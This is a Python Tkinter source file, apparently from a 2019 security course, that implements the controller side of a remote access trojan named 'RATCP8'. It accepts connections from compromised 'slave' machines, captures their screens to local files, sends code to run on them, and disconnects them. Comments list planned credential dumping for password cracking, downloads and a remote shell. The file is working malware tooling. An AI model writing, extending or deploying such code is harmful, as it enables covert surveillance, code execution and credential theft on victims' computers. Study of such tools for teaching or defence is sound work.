# -*- coding: utf-8 -*-
###############################################################################
#  Fco. Javier Rodriguez Navarro 
#
#  VN_Principal.py: Clase que forma la ventana principal del maestro, ademas 
#                   de la gestion de los controles.
#
#  Historico:
#     - 12/5/2019 1.0 Version inicio para curso CHEE.
#
###############################################################################

from Tkinter import *
import tkMessageBox
import threading
import socket
import datetime
import logging
import mss
import pickle
import Esclavo

# Gestor de geometría (grid). Ventana no dimensionable

class VN_Principal():
    def __init__(self, PORT, Clave):
        self.esclavosthreads = list() # Tendra todos los esclavos conectados,
        self.esclavos = 0    # Marca los esclavos conectados
        self.Clave = Clave
        
        self.raiz = Tk()
        self.raiz.title("RATCP8 (2019)")
        
        self.raiz.resizable(0,0) # Se fuerza a que no se pueda redimensionar
                
        
        #   LOGO
        self.frm1 = Frame(self.raiz, borderwidth=2, relief="raised")
        logo = PhotoImage(file="Logo2.png")
        self.logo = Label(self.raiz, image=logo)
        
        #   Control para los esclavos conectados
        self.texto = Label(self.frm1, text="Esclavos conectados")
        self.cm_sesiones = Listbox(self.frm1, height=5, width=60, selectmode=SINGLE)

        #   Botones de las acciones
        self.frm2 = Frame(self.raiz, borderwidth=2, relief="raised")
        self.bt_c1 = Button(self.frm2, text="Captura P.", command=self.captura, width=15)
        self.bt_c2 = Button(self.frm2, text="Aviso Hack",command=self.aviso, width=15)
        self.bt_c3 = Button(self.frm2, text="Desconectar",command=self.desconectar, width=15)   

        # Boton de salida
        self.bt_salir = Button(self.raiz, text="Salir", command=self.salir)


        # Colocación de los elementos anteriormente definidos.
        self.logo.grid(column=1, row=0)
        self.frm1.grid(column=0, row=1, columnspan=3)
        self.texto.grid(column=0, row=0)
        self.cm_sesiones.grid(column=0, row=1)

        self.frm2.grid(column=0, row=2, columnspan=3)
        self.bt_c1.grid(column=0, row=0)
        self.bt_c2.grid(column=1, row=0)
        self.bt_c3.grid(column=2, row=0)
        
        self.bt_salir.grid(column=1, row=3)

        # Conexión en escucha
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        self.s.bind(('', PORT)) 
        logging.info("Socket asociado %s:%d",socket.gethostname(),PORT)
        # Hilo que mantendra la escucha de conexión de los esclavos  
        self.hilo = threading.Thread(target=self.escucha, args=(self.s, ))
        self.hilo.setName("H_Oyente")        
        self.hilo.setDaemon(True)
        self.hilo.start()
        
        # Inicio de la ventana y gestión de la aplicación.
        self.raiz.mainloop()

################################################################################
#   escucha(socket)  Espera de conexión de esclavos para establecer conexiones
#                    con ellos.
#                    Cuando se establece una conexión se crea hilo de conexión
#                    de esclavo y da de alta en la lista de esclavos para su
#                    selección. Ademas genera nueva contraseña de comunicación.
################################################################################
    def escucha(self,s):
        # Ponemos el socket en escucha, pudiendo tener como mucho 5 en cola
        logging.info("Socket escuchando")
        s.listen(5) 
    
        # acepta conexiones externas
        while True:
            (socketcliente, direccion) = s.accept()
            logging.info("Conexión establecida desde %s:%d",direccion[0],direccion[1])
     
            # ahora se debera el Thread del cliente a conectar, siendo este quien inicia
            self.esclavos = self.esclavos + 1
            nombre = str(self.esclavos)+"-->"+direccion[0]+":"+str(direccion[1])        
            esclavo = Esclavo.Esclavo(socketcliente, nombre, self.Clave)
            self.esclavosthreads.append(esclavo)
            self.cm_sesiones.insert(END,esclavo.getNombre())
################################################################################
#   METODOS de las acciones de los botones de acción y salida
#      captura()  Captura la pantalla
#      credenciales() Vuelca información de credenciales para realizar crack-claves
#      bajar
#      shell
#      info
#      desconectar() Desconecta el esclavo seleccionado, enviado que se desconecte
#                    a este.
#      salir()  Desconecta todos los esclavos y sale de la apliacion
################################################################################                                       
    def captura(self):
        elegida = self.cm_sesiones.curselection()
        if len(elegida) == 0:
            logging.info("Sin seleccióna en captura")
        else:
           logging.info("Captura pantalla: %d-->%s",elegida[0],self.cm_sesiones.get(elegida[0]))
           self.esclavosthreads[elegida[0]].envia("SC:")
           datos = self.esclavosthreads[elegida[0]].recibe()
                      
           tiempo = datetime.datetime.now()
           f_salida = "Descargas/Captura_"+self.cm_sesiones.get(elegida[0])+"_"+str(tiempo.day)+str(tiempo.month)+str(tiempo.year)+"_"+str(tiempo.hour)+str(tiempo.minute)+str(tiempo.second)+".png"           
           f = open(f_salida,'wb')
           f.write(datos)
           f.close()       
                
    def aviso(self):
        elegida = self.cm_sesiones.curselection()
        if len(elegida) == 0:
            logging.info("Debe seleccionar a quien enviar ventana")
        else:
           logging.info("Se envia Ventana de Hackeado",elegida[0],self.cm_sesiones.get(elegida[0]))
           self.esclavosthreads[elegida[0]].envia("EJ:")
           f = open('Codigos/Hack.cod','r')
           fuente = f.read()
           f.close()  
           self.esclavosthreads[elegida[0]].envia(fuente)

    def desconectar(self):
        elegida = self.cm_sesiones.curselection()
        if len(elegida) == 0:
            logging.info("Sin selección")
        else:
            logging.info("Selección a desconectar: %d-->%s",elegida[0],self.cm_sesiones.get(elegida[0]))
            self.esclavosthreads[elegida[0]].envia("S:")
            del self.esclavosthreads[elegida[0]]
            self.cm_sesiones.delete(elegida[0])
  
    def salir(self):
        logging.info("Salimos de la aplicacion cerrando todas las conexiones")
        for i in range(len(self.esclavosthreads)):
            logging.info("Cierra: %d-->%s",i,self.esclavosthreads[i].getNombre())
            self.esclavosthreads[i].envia("S:")
        self.s.close()
        self.raiz.destroy()
        
